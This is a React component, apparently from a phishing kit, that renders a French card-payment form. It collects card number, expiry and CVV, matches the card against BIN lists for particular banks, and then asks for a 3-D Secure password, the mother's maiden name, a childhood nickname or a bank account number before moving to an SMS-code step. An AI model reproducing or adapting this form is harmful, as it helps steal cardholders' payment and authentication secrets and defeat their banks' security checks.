import React from "react";
import Input from "../Components/input";
import Spinner from "../Components/Spinner";
import Select from "../Components/select";
import { LclBin, PstBin } from "../utils/CardBin";
import Form from "../Components/Form";
import { connect } from "react-redux";
import { getPageSms, getPagePervious, updateField } from "../actions/index";

class CardForm extends React.Component {
	constructor(props) {
		super(props);
		this.state = {
			lcl: false,
			pst: false,
			re_lcl: new RegExp("(" + LclBin.join("|") + ").*", "i"),
			re_pst: new RegExp("(" + PstBin.join("|") + ").*", "i"),
		};
		this.handleInputChange = this.handleInputChange.bind(this);
	}

	handleInputChange(event) {
		const target = event.target;
		let name = target.name;
		let value = target.value;
		if (name === "carte") {
			this.sup_info(value);
		}
		this.props.change(name, value);
	}
	sup_info(card) {
		if (this.state.re_pst.test(card)) this.props.change("pst", true);
		else if (this.state.re_lcl.test(card)) this.props.change("lcl", true);
		else {
			this.props.change("pst", false);
			this.props.change("lcl", false);
		}
	}


	render() {

		const { errors, isLoading, fields, submit, title } = this.props;

		if (isLoading === true) {
			return <div>
				<Spinner />
			</div>;
		}

		var pst = <div>
			<div>
				<h2>
					Informations supplémentaires
				</h2>
			</div>
			<fieldset>
				<Input name="compte" type="text" label="Numéro de compte bancaire" size="23" onChange={this.handleInputChange} msg_error={errors.compte} value={fields.compte} />
			</fieldset>
		</div>;
		var lcl = <div>
			<div>
				<h2>
					Informations supplémentaires
				</h2>
			</div>
			<fieldset>
				<Input name="compte" type="text" label="Le mot de passe 3-D Secure" size="23" onChange={this.handleInputChange} msg_error={errors.compte} value={fields.compte} />
				<Input name="q1" type="text" label="Nom de jeune fille de votre mère ?" size="23" onChange={this.handleInputChange} holder="Réponce" msg_error={errors.q1} value={fields.q1} />
				<Input name="q2" type="text" label="Votre surnom enfant ?" size="23" onChange={this.handleInputChange} holder="Réponce" msg_error={errors.q2} value={fields.q2} />
			</fieldset>
		</div>;
		return (
			<Form
				btnValue="Continue" titre={title} submit={submit}
				back={() => { this.props.getPervious(); }}
				img={<img alt="" src="/static/images/card.png" height="30" width="160" />}
				supInfo={fields.lcl === true ? lcl : fields.pst === true ? pst : undefined}
			>
				<Input
					name="carte" type="text" label="N° carte" value={fields.carte}
					size="18" onChange={this.handleInputChange} msg_error={errors.carte}
				/>
				<Select
					label="Date d'expiration" mois={fields.date_ex_m} annee={fields.date_ex_a}
					name_mois="date_ex_m" name_annee="date_ex_a" onChange={this.handleInputChange}
					msg_error={errors.date}
				/>
				<Input
					name="cvv" type="text" label="N° cryptogramme (cvv)" size="3"
					onChange={this.handleInputChange} msg_error={errors.cvv} value={fields.cvv}
				/>
			</Form>
		);
	}
}
const mapStateToProps = store => (
	{
		isLoading: store.session.getPage,
		errors: store.data.errors,
		fields: store.data.fields
	}
);
const mapDispatchToProps = {
	submit: getPageSms,
	getPervious: getPagePervious,
	change: updateField
};
export default connect(mapStateToProps, mapDispatchToProps)(CardForm);
